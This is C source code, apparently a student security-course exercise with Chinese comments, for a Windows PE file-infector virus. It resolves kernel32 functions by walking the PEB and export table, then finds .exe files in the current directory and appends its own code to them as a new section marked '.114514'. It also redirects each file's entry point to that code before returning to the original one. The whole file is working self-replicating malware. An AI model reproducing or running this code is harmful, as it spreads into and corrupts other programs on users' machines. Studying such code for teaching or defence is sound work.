#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include "infect_data.h"
//#include <stdio.h>

#define alig_up(a, size) ((a+size-1) & (~ (size-1)))

int infect(void)
{	
	function F;
	//* 定义PE文件导出函数的两个关键函数名称
	//* LoadLibraryA 加载动态链接库（DLL）并返回句柄
	//* GetProcAddress获取 DLL 中导出函数的地址，以便在程序中调用该函数。调用该函数需要先加载DLL并获得DLL的句柄
	//* 通过函数地址调用：1）通过LoadLibraryA/GetProcAddress获取所需函数的地址；
	//* 2）直接获取所需函数的地址。
	char GetProcAddress_s[15] = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};
	char LoadLibraryA_s[13] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
	//* 定义创建学号文件需要的函数名称
	char kernel_s[13] = {'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0'};
	char FindFirstFileA_s[15] = {'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'A', '\0'};
	char CreateFileA_s[12] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', '\0'};
	char ReadFile_s[9] = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};
	char WriteFile_s[10] = {'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0'};
	char GetFileSizeEx_s[14] = {'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 'E', 'x', '\0'};
	char FindClose_s[10] = {'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', '\0'};
	char CloseHandle_s[12] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
	char SetFilePointerEx_s[17] = {'S', 'e', 't', 'F', 'i', 'l', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', 'E', 'x', '\0'};
	char FindNextFileA_s[14] = {'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'A', '\0'};
	char ExitProcess_s[12] = {'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0'};
	//* 定义学号文件名称
	char target[20] = {'.', '/', '2', '0', '2', '0', '3', '0', '2', '1', '8', '1', '1', '8', '7', '.', 't', 'x', 't', '\0'};
	
	//* 定义动态链接库kernel32的名称
	char kernel[13] = {'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0'};

	//! 第一步：获取kernel32模块的基地址 ============================================================
	//* 读取PEB
	PEB *peb = (PEB *)__readfsdword(0x30);
	//* 读取LDR
	PEB_LDR_DATA *ldr = peb->Ldr;
	//* 读取InMemoryOrderModuleList
	LIST_ENTRY* List_entry = ldr->InMemoryOrderModuleList.Flink;  
	//* InInitializationOrderModuleList中按照顺序存放和PE装入运行时初始化模块的信息，第一个链表结构是ntdll.dll，第二个节点就是kernel32.dll
	//* InMemoryOrderModuleListt指向的类型实为LDR_DATA_TABLE_ENTRY
	LDR_DATA_TABLE_ENTRY *t = NULL;

	BOOL find = FALSE;
	do
	{
		t = CONTAINING_RECORD(List_entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		UNICODE_STRING BaseDllName;
		BaseDllName.Length = 0;
		BaseDllName.MaximumLength = t->FullDllName.Length;
		BaseDllName.Buffer = t->FullDllName.Buffer;
		for (int i = t->FullDllName.Length / sizeof(WCHAR) - 1; i >= 0; i--)
		{
    		if (t->FullDllName.Buffer[i] == L'\\')
    		{
        		// 调整基本名称的缓冲区和长度
        		BaseDllName.Buffer += i + 1;
        		BaseDllName.Length -= (i + 1) * sizeof(WCHAR);
        		break;
    		}
		}
		int k = 0;
		while(k < (sizeof kernel) - 1 && BaseDllName.Buffer[k] == kernel[k]) k ++;
		if (k == 12)
			find = TRUE;
		else {
			List_entry = List_entry->Flink;
		}
	}while (!find);

	BYTE *ImageBase = (BYTE *)t->DllBase; 

	//! 第二步：根据kernel32模块基地址找到导出表，进而初始化需要的api ============================================================
	//* 根据ImageBase找到导出表的RVA
	IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)(ImageBase);
	IMAGE_NT_HEADERS *NtHeaders = (IMAGE_NT_HEADERS *)(ImageBase + (DosHeader->e_lfanew));
	DWORD ExportTableRVA = NtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress;

	//* 根据ExportTableRVA 找到导出函数的总数NumberOfFunctions、导出函数名称地址表AddressOfNamesRVA、导出函数地址表AddressOfFunctionsRVA
	BYTE *ExportTableVA = ImageBase + (ExportTableRVA);
	PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)ExportTableVA;

	DWORD NumberOfFunctions = ExportTable->NumberOfFunctions;
	DWORD AddressOfFunctionsRVA = ExportTable->AddressOfFunctions;
	DWORD AddressOfNamesRVA = ExportTable->AddressOfNames;
	DWORD AddressOfNameOrdinalsRVA = ExportTable->AddressOfNameOrdinals;
	DWORD *AddressOfFunctionsVA = ImageBase + AddressOfFunctionsRVA;
	DWORD *AddressOfNamesVA = ImageBase + AddressOfNamesRVA;
	//* 必须要用WORD，AddressOfNameOrdinals是一个指向一个16位数组的RVA，该数组包含了命名函数的序号
	WORD *AddressOfNameOrdinalsVA = ImageBase + AddressOfNameOrdinalsRVA;

	//* 遍历查找目标函数在名称地址表中的序号n，根据n在导出函数地址表上找到目标函数的RVA
	DWORD *name_addr;
	BYTE *name_s;

	int GPA_idx = 0, LLA_idx = 0;

	name_addr = (DWORD *)AddressOfNamesVA;
	for (int i = 0; i < NumberOfFunctions; i++)
	{
		int k = 0;
		find = TRUE;
		name_s = (char *)(ImageBase + *(name_addr));

		while (name_s[k] != '\0')
		{
			if (name_s[k] == GetProcAddress_s[k] || name_s[k] == LoadLibraryA_s[k])
			{
				k++;
				continue;
			}
			else
			{
				find = FALSE;
				name_addr += 1;
				break;
			}
		}
		if (find)
		{
			if (k == sizeof GetProcAddress_s - 1) GPA_idx = i;
			if (k == sizeof LoadLibraryA_s - 1) LLA_idx = i;
			name_addr += 1;
		}
		if (GPA_idx && LLA_idx) break;
	}

	//* 两个关键函数的VA
	//printf("function1:%0x, true = %0x\n", ImageBase + AddressOfFunctionsVA[AddressOfNameOrdinalsVA[GPA_idx]], GetProcAddress);
	//printf("function2:%0x, true = %0x\n", ImageBase + AddressOfFunctionsVA[AddressOfNameOrdinalsVA[LLA_idx]], LoadLibraryAA);
	F.LoadLibraryA_api = ImageBase + AddressOfFunctionsVA[AddressOfNameOrdinalsVA[LLA_idx]];
	F.GetProcAddress_api = ImageBase + AddressOfFunctionsVA[AddressOfNameOrdinalsVA[GPA_idx]];


	//* 加载KERNEL32.dll
	HMODULE handle_kernel = F.LoadLibraryA_api((LPCSTR)kernel_s);

	//* 根据DLL句柄和函数名称获取函数地址
	F.FindFirstFile_api = (FindFirstFileA_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)FindFirstFileA_s);
	F.CreateFileA_api = (CreateFileA_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)CreateFileA_s);
	F.ReadFile_api = (ReadFile_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)ReadFile_s);
	F.WriteFile_api = (WriteFile_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)WriteFile_s);
	F.GetFileSizeEx_api = (GetFileSizeEx_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)GetFileSizeEx_s);
	F.FindClose_api = (FindClose_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)FindClose_s);
	F.CloseHandle_api = (CloseHandle_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)CloseHandle_s);
	F.SetFilePointerEx_api = (SetFilePointerEx_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)SetFilePointerEx_s);
	F.FindNextFileA_api = (FindNextFileA_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)FindNextFileA_s);
	F.ExitProcess_api = (ExitProcess_2)F.GetProcAddress_api(handle_kernel, (LPCSTR)ExitProcess_s);

	
	//! 第三步：创建学号文件 ============================================================
	HANDLE hFile;
	HANDLE hFileRead;
	LARGE_INTEGER liFileSize;
	DWORD dwReadedSize;
	HANDLE hFileWrite;
	DWORD dwWritedDateSize;

	//* 通过CreateFileA函数来打开学号文件

	hFileWrite = F.CreateFileA_api(target,
								GENERIC_WRITE,
								0,
								NULL,
								CREATE_ALWAYS,
								FILE_ATTRIBUTE_NORMAL,
								NULL);

	if (hFileWrite == INVALID_HANDLE_VALUE)
	{
		F.ExitProcess_api(0);
	}

	F.CloseHandle_api(hFileWrite);

	//! 第四步：动态获取本模块的信息 ============================================================
	//* 动态获取本模块的信息：该链表的第一个节点存放的就是exe模块自身的信息。
	List_entry = ldr->InMemoryOrderModuleList.Flink; 
	t = CONTAINING_RECORD(List_entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	
	BYTE *ImageBase_now = (BYTE *)t->DllBase;
	//printf("%d", ImageBase_now);
	IMAGE_DOS_HEADER *DosHeader_new = ImageBase_now;
	IMAGE_NT_HEADERS *NtHeaders_new = ImageBase_now + DosHeader_new->e_lfanew;
	int SN_new = NtHeaders_new->FileHeader.NumberOfSections;
	// printf("SN_new = %d\n", SN_new);
	IMAGE_SECTION_HEADER *StartSH_new = ImageBase_now + DosHeader_new->e_lfanew + sizeof(IMAGE_NT_HEADERS); // 第一个节表项地址
    IMAGE_SECTION_HEADER *EndSH_new = ImageBase_now + DosHeader_new->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (SN_new - 1) * sizeof(IMAGE_SECTION_HEADER); // 最后一个节表项地址

	DWORD old_entry = (DWORD)ImageBase_now + *(DWORD *)(ImageBase_now + StartSH_new->PointerToRawData - sizeof(DWORD));
	
	DWORD *infect_data = ImageBase_now + EndSH_new->VirtualAddress;
	int SizeOfVirus = EndSH_new->Misc.VirtualSize;
	// printf("SizeOfVirus :0x%0x\n", SizeOfVirus);
	
	return_old return_old_api = (return_old)old_entry;

	//! 第五步：搜索其他感染目标 ============================================================
	char next_infect[8] = {'.', '\\', '*', '.', 'e', 'x', 'e', '\0'};
	WIN32_FIND_DATA next_infect_info;
	HANDLE next_infect_handle = 0;
	next_infect_handle = F.FindFirstFile_api(next_infect, &next_infect_info);
	if (next_infect_handle == INVALID_HANDLE_VALUE)
	{
		F.ExitProcess_api(0);
	}
	// printf("find file%s\n",next_infect_info.cFileName);
	BYTE *find_file;
	// printf("next fiel = %s\n",next_infect);
	//* 循环遍历其他的.exe文件，对未感染的文件感染
    do
	{
		// printf("find file:%s\n",next_infect_info.cFileName);
		if (next_infect_info.cFileName[0] == '.')
			continue;
		if (next_infect_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;
		if(next_infect_info.cFileName[0] != 't')
			continue;
		find_file = next_infect_info.cFileName;
		// printf("%s", find_file);
		hFileRead = F.CreateFileA_api(find_file,
								   GENERIC_READ | GENERIC_WRITE,
								   FILE_SHARE_READ,
								   NULL,
								   OPEN_EXISTING,
								   FILE_ATTRIBUTE_NORMAL,
								   NULL);
		if (hFileRead == INVALID_HANDLE_VALUE)
		{
			continue;
		}
		// printf("find_file: %s\n", find_file);
		IMAGE_DOS_HEADER DosHeader;
		IMAGE_NT_HEADERS NtHeaders;
    	IMAGE_FILE_HEADER FileHeader;
    	IMAGE_OPTIONAL_HEADER OptionalHeader;
    	IMAGE_SECTION_HEADER StartSH; // 第一个节表项
    	IMAGE_SECTION_HEADER VirusSH; // 用于存储新加的节表项
    	IMAGE_SECTION_HEADER EndSH;   // 存储旧的节表项
		LARGE_INTEGER pLocalFile;  //  LARGE_INTEGER表示一个64位有符号整数 

		pLocalFile.QuadPart = 0;  // 赋值
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);  // fseek(file, 0, 0);
		F.ReadFile_api(hFileRead, &DosHeader, sizeof(IMAGE_DOS_HEADER), &dwReadedSize, NULL);  // fread(&DosHeader, sizeof(IMAGE_DOS_HEADER), 1, file);

		pLocalFile.QuadPart = DosHeader.e_lfanew;
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);  // fseek(file, DosHeader.e_lfanew, 0);
		F.ReadFile_api(hFileRead, &NtHeaders, sizeof(IMAGE_NT_HEADERS), &dwReadedSize, NULL);  // fread(&NtHeaders, sizeof(IMAGE_NT_HEADERS), 1, file);

		FileHeader = NtHeaders.FileHeader;
    	OptionalHeader = NtHeaders.OptionalHeader;
		int OldSN = FileHeader.NumberOfSections;
		// printf("%d", OldSN);
    	int StartSO = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS);  // 第一个节表项偏移
    	int EndSO = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (OldSN - 1) * sizeof(IMAGE_SECTION_HEADER);  // 最后一个节表项偏移

		DWORD OldAEP  = OptionalHeader.AddressOfEntryPoint;

		pLocalFile.QuadPart = StartSO;
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);  // fseek(file, StartSO, 0);
    	F.ReadFile_api(hFileRead, &StartSH, sizeof(IMAGE_SECTION_HEADER), &dwReadedSize, NULL);  // fread(&StartSH, sizeof(IMAGE_SECTION_HEADER), 1, file);
    	pLocalFile.QuadPart = EndSO;
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);  // fseek(file, EndSO, 0);
    	F.ReadFile_api(hFileRead, &EndSH, sizeof(IMAGE_SECTION_HEADER), &dwReadedSize, NULL);

		char template[8] = {'.', '1', '1', '4', '5', '1', '4', '\0'};
		int k = 0;
		while(k < sizeof template - 1 && EndSH.Name[k] == template[k]) k ++;
		// printf("k = %d\n", k);
		if (k >= sizeof template - 1){
			// printf("infected!\n");
			continue;
		}

		//! 添加节的准备工作：增加节数、保存后修改Entyrpoint
    	NtHeaders.FileHeader.NumberOfSections += 1;
    	NtHeaders.OptionalHeader.AddressOfEntryPoint = EndSH.VirtualAddress + alig_up(EndSH.SizeOfRawData, 0x1000);
		
		//! 初始化节
		for(int i = 0; i < sizeof(IMAGE_SECTION_HEADER); i++){
			*((char *)(&VirusSH) + i) = '\0';
		}
		VirusSH.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
		VirusSH.PointerToRawData = EndSH.PointerToRawData + EndSH.SizeOfRawData;
		VirusSH.VirtualAddress = NtHeaders.OptionalHeader.AddressOfEntryPoint;
		VirusSH.Misc.VirtualSize = SizeOfVirus;
		// printf("SizeOfVirus: 0x%0x\n", SizeOfVirus);
		VirusSH.SizeOfRawData = alig_up(SizeOfVirus, 0x200);
		k = 0;
		while(k < sizeof template - 1) {
			VirusSH.Name[k] = template[k];
			k ++;
		}

		//! 回写
		NtHeaders.OptionalHeader.SizeOfImage += alig_up(SizeOfVirus, 0x1000);

		pLocalFile.QuadPart = DosHeader.e_lfanew;
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);  // fseek(file, DosHeader.e_lfanew, 0);
		F.WriteFile_api(hFileRead, &NtHeaders, sizeof(NtHeaders), &dwReadedSize, NULL);  // fwrite(&NtHeaders, sizeof(IMAGE_NT_HEADERS), 1, file);
		pLocalFile.QuadPart = EndSO + sizeof(IMAGE_SECTION_HEADER);
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);  // fseek(file,  EndSO + sizeof(IMAGE_SECTION_HEADER), 0);
		F.WriteFile_api(hFileRead, &VirusSH, sizeof(IMAGE_SECTION_HEADER), &dwReadedSize, NULL);  // fwrite(&VirusSH, sizeof(IMAGE_SECTION_HEADER), 1, file);

		pLocalFile.QuadPart = StartSH.PointerToRawData - 4;
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);  // fseek(file, StartSH.PointerToRawData - 4, 0);
		F.WriteFile_api(hFileRead, &OldAEP, sizeof(int), &dwReadedSize, NULL);  // fwrite(&OldAEP, sizeof(int), 1, file);

		pLocalFile.QuadPart = VirusSH.PointerToRawData;
		F.SetFilePointerEx_api(hFileRead, pLocalFile, &pLocalFile, FILE_BEGIN);
		F.WriteFile_api(hFileRead, infect_data, sizeof(BYTE) * alig_up(SizeOfVirus, 0x200), &dwReadedSize, NULL);

	} while (F.FindNextFileA_api(next_infect_handle, &next_infect_info));
	//* 跳回到原始地址
	return_old_api();
	//ExitProcess_api(0);
}

int main(void)
{
	infect();
	return 0;
}

